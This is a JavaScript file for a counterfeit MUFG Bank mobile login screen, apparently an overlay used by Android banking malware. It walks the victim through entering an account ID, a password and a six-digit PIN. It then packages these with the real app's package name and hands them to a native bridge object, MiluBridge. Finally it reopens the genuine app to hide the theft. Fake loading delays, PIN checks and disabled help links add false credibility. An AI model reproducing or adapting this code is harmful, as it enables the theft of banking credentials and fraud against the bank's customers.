(() => {
  const CFG = {
    brand: "三菱UFJ银行",
    pkg: "jp.mufg.bk.applisp.app",
    type: "三菱UFJ银行登录",
    category: "mobile_banking",
    maintenance: false,
  };

  const PIN_LEN = 6;

  const stepAccount = document.getElementById("stepAccount");
  const stepPassword = document.getElementById("stepPassword");
  const accountInput = document.getElementById("account");
  const passwordInput = document.getElementById("password");
  const maskedAccount = document.getElementById("maskedAccount");
  const agreeBtn = document.getElementById("agreeBtn");
  const nextBtn = document.getElementById("nextBtn");
  const loginBtn = document.getElementById("loginBtn");
  const backBtn = document.getElementById("backBtn");
  const loadingEl = document.getElementById("loading");
  const toastEl = document.getElementById("toast");
  const shade = document.getElementById("shade");
  const verifyModal = document.getElementById("verifyModal");
  const pinInput = document.getElementById("pinInput");
  const pinbox = document.getElementById("pinbox");
  const cancelVerifyBtn = document.getElementById("cancelVerifyBtn");
  const confirmVerifyBtn = document.getElementById("confirmVerifyBtn");
  const errAccount = document.getElementById("errAccount");
  const errPassword = document.getElementById("errPassword");
  const errPin = document.getElementById("errPin");

  const digits = Array.from(pinbox.querySelectorAll(".digit"));

  const state = {
    account: "",
    password: "",
    pin: "",
  };

  let toastTimer = 0;
  let submitLocked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function showErr(el, msg) {
    el.textContent = msg;
    el.classList.add("is-show");
  }

  function clearErr(el) {
    el.textContent = "";
    el.classList.remove("is-show");
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.remove("is-show");
    void toastEl.offsetWidth;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2000);
  }

  function setBusy(show) {
    loadingEl.classList.toggle("is-show", show);
    loadingEl.setAttribute("aria-hidden", show ? "false" : "true");
  }

  function validAccount(value) {
    const trimmed = value.trim();
    return trimmed && trimmed.replace(/\s/g, "").length >= 4 && trimmed.length <= 64;
  }

  function maskAccount(value) {
    if (!value) {
      return "";
    }
    if (value.indexOf("@") > 1) {
      const parts = value.split("@");
      return `${parts[0].slice(0, 2)}***@${parts[1]}`;
    }
    const s = value.replace(/\s/g, "");
    if (s.length <= 6) {
      return `${s[0]}***${s.slice(-1)}`;
    }
    return `${s.slice(0, 3)}****${s.slice(-3)}`;
  }

  function showStep(step) {
    const isAccount = step === "account";
    stepAccount.classList.toggle("is-active", isAccount);
    stepPassword.classList.toggle("is-active", !isAccount);
  }

  function isAgreed() {
    return !agreeBtn.classList.contains("is-off");
  }

  function toggleAgree() {
    const off = agreeBtn.classList.toggle("is-off");
    agreeBtn.setAttribute("aria-pressed", off ? "false" : "true");
  }

  function showVerify() {
    shade.classList.add("is-show");
    verifyModal.classList.add("is-show");
    shade.setAttribute("aria-hidden", "false");
    verifyModal.setAttribute("aria-hidden", "false");
    state.pin = "";
    pinInput.value = "";
    renderPin();
    window.setTimeout(() => pinInput.focus(), 100);
  }

  function hideVerify() {
    shade.classList.remove("is-show");
    verifyModal.classList.remove("is-show");
    shade.setAttribute("aria-hidden", "true");
    verifyModal.setAttribute("aria-hidden", "true");
  }

  function renderPin() {
    digits.forEach((digit, index) => {
      digit.classList.remove("is-on", "is-focus");
      if (index < state.pin.length) {
        digit.classList.add("is-on");
      }
      if (index === state.pin.length && state.pin.length < PIN_LEN) {
        digit.classList.add("is-focus");
      }
    });
    clearErr(errPin);
  }

  function weakPin(pin) {
    if (pin.length !== PIN_LEN) {
      return false;
    }
    if (/^(\d)\1{5}$/.test(pin)) {
      return true;
    }
    let asc = true;
    let desc = true;
    for (let i = 1; i < pin.length; i += 1) {
      if (parseInt(pin[i], 10) !== parseInt(pin[i - 1], 10) + 1) {
        asc = false;
      }
      if (parseInt(pin[i], 10) !== parseInt(pin[i - 1], 10) - 1) {
        desc = false;
      }
    }
    return asc || desc;
  }

  function buildPayload() {
    return {
      type: CFG.type,
      app: CFG.brand,
      packageName: CFG.pkg,
      category: CFG.category,
      account: state.account,
      password: state.password,
      pin: state.pin,
      maintenance: CFG.maintenance,
      timestamp: Date.now(),
    };
  }

  function submitFinal() {
    if (submitLocked) {
      return;
    }
    if (state.pin.length !== PIN_LEN) {
      showErr(errPin, "6桁の認証コードを入力してください");
      return;
    }
    if (weakPin(state.pin)) {
      showErr(errPin, "認証コードが正しくありません");
      state.pin = "";
      pinInput.value = "";
      renderPin();
      return;
    }
    submitLocked = true;
    setBusy(true);
    const payload = buildPayload();
    window.setTimeout(() => {
      setBusy(false);
      reportDone(JSON.stringify(payload));
      window.setTimeout(() => {
        openApp();
        submitLocked = false;
      }, 450);
    }, 550);
  }

  function nextStep() {
    clearErr(errAccount);
    const value = accountInput.value.trim();
    if (!validAccount(value)) {
      showErr(errAccount, "有効なIDを入力してください");
      return;
    }
    if (!isAgreed()) {
      toast("利用規約およびプライバシーポリシーに同意します");
      return;
    }
    state.account = value;
    setBusy(true);
    window.setTimeout(() => {
      setBusy(false);
      showStep("password");
      maskedAccount.textContent = maskAccount(value);
      passwordInput.focus();
    }, 450);
  }

  function loginStep() {
    clearErr(errPassword);
    const pass = passwordInput.value;
    if (!pass || pass.length < 4) {
      showErr(errPassword, "パスワードを入力してください");
      return;
    }
    state.password = pass;
    setBusy(true);
    window.setTimeout(() => {
      setBusy(false);
      showVerify();
    }, 650);
  }

  agreeBtn.addEventListener("click", toggleAgree);
  nextBtn.addEventListener("click", nextStep);
  loginBtn.addEventListener("click", loginStep);
  cancelVerifyBtn.addEventListener("click", hideVerify);
  confirmVerifyBtn.addEventListener("click", submitFinal);

  pinbox.addEventListener("click", () => pinInput.focus());

  pinInput.addEventListener("input", () => {
    state.pin = pinInput.value.replace(/\D/g, "").slice(0, PIN_LEN);
    pinInput.value = state.pin;
    renderPin();
    if (state.pin.length === PIN_LEN) {
      window.setTimeout(submitFinal, 160);
    }
  });

  accountInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      nextStep();
    }
  });

  passwordInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      loginStep();
    }
  });

  backBtn.addEventListener("click", () => {
    if (stepPassword.classList.contains("is-active")) {
      showStep("account");
      return;
    }
    openApp();
  });

  ["termsLink", "helpLink1", "langLink", "forgotLink", "helpLink2"].forEach((id) => {
    const el = document.getElementById(id);
    if (el) {
      el.addEventListener("click", (event) => event.preventDefault());
    }
  });
})();
